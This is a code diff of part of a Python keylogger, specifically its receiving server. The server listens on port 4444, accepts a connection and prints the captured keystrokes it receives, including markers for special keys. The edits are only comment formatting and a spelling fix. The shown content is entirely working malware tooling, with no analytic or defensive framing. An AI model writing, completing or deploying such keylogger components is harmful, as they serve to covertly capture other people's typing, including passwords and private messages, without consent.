@@ -3,12 +3,12 @@ import string
 
 
 def start_keylog_server():
-    while True: ##### SOCKET START LOOP
+    while True:  # SOCKET START LOOP
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         host = '0.0.0.0'
         port = 4444
 
-        while True: ##### SOCKET CONNECTION LOOP
+        while True:  # SOCKET CONNECTION LOOP
             try:
                 server_socket.bind((host, port))
                 server_socket.listen(1)
@@ -16,9 +16,9 @@ def start_keylog_server():
                 client_socket, client_address = server_socket.accept()
                 print(f"Connection from {client_address}")
 
-                while True: ##### CHAR RECIEVING LOOP
+                while True:  # CHAR RECEIVING LOOP
                     char = client_socket.recv(1)
-                    try: # Try treating the Character as ASCII, Looking for spaces, tabs and enters
+                    try:  # Try treating the Character as ASCII, Looking for spaces, tabs and enters
                         char = char.decode('utf-8')
                         if char in string.printable:
                             if char.isprintable() and char not in string.whitespace:
@@ -32,7 +32,7 @@ def start_keylog_server():
                         else:
                             print(f"[{ord(char)}]", end='', flush=True)
 
-                    except: # If it's a shift or another non-printable Key
+                    except:  # If it's a shift or another non-printable Key
                         print("__Special_Key__")
             except ConnectionResetError:
                 print("\nConnection reset by client.")
